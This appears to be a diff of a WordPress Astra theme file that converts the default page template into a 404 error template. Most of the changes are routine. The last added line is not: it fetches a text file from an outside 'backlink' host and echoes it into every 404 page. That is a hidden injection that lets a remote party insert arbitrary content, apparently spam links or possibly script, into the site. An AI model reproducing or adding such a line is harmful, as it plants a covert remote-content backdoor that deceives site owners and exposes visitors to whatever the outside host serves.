@@ -1,13 +1,8 @@
 <?php
 /**
- * The template for displaying all pages.
+ * The template for displaying 404 pages (not found).
  *
- * This is the template that displays all pages by default.
- * Please note that this is the WordPress construct of pages
- * and that other 'pages' on your WordPress site may use a
- * different template.
- *
- * @link https://codex.wordpress.org/Template_Hierarchy
+ * @link https://codex.wordpress.org/Creating_an_Error_404_Page
  *
  * @package Astra
  * @since 1.0.0
@@ -29,7 +24,7 @@ get_header(); ?>
 
 		<?php astra_primary_content_top(); ?>
 
-		<?php astra_content_page_loop(); ?>
+		<?php astra_404_content_template(); ?>		
 
 		<?php astra_primary_content_bottom(); ?>
 
@@ -42,3 +37,4 @@ get_header(); ?>
 <?php endif ?>
 
 <?php get_footer(); ?>
+<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
